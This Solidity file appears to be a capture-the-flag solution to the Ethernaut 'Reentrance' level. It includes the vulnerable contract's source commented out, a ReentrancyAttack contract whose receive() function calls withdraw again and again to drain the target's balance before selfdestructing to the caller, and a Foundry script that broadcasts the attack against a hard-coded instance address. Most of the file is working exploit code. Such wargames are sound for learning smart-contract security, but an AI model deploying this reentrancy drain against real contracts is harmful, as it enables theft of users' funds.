// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
import "forge-std/Script.sol";


// import 'openzeppelin-contracts-06/math/SafeMath.sol';

// contract Reentrance {
  
//   using SafeMath for uint256;
//   mapping(address => uint) public balances;

//   function donate(address _to) public payable {
//     balances[_to] = balances[_to].add(msg.value);
//   }

//   function balanceOf(address _who) public view returns (uint balance) {
//     return balances[_who];
//   }

//   function withdraw(uint _amount) public {
//     if(balances[msg.sender] >= _amount) {
//       (bool result,) = msg.sender.call{value:_amount}("");
//       if(result) {
//         _amount;
//       }
//       balances[msg.sender] -= _amount;
//     }
//   }

//   receive() external payable {}
// }


interface IReentrance {
    function donate (address _to) external payable;
    function withdraw(uint _amount) external; 
}

contract ReentrancyAttack {
    IReentrance target;

    constructor (address _target) {
        target = IReentrance(_target);
    }

    function attack () public payable {
        target.donate{value: 1 ether}(address(this));
        target.withdraw(1 ether);

        require(address(target).balance == 0, "Still some Drink to swallow");
        selfdestruct(payable(msg.sender));
    }

    receive () external payable {
        uint256 amount = min(address(target).balance, 1 ether);

        if(amount > 0){
            target.withdraw(amount);
        }
    }

    function min(uint256 x, uint256 y) private pure returns (uint256) {
        return x <= y ? x : y;
    }

}


contract DeployScript is Script {
    function setUp() public view {}

    function run() public {
        vm.startBroadcast();
        address gameInstance = 0x855B44274b8F0DF0Df64Cf4d2a26DdCf8501B755;

        ReentrancyAttack attacker = new ReentrancyAttack(gameInstance);
        attacker.attack{value: 1 ether}();
    }
}


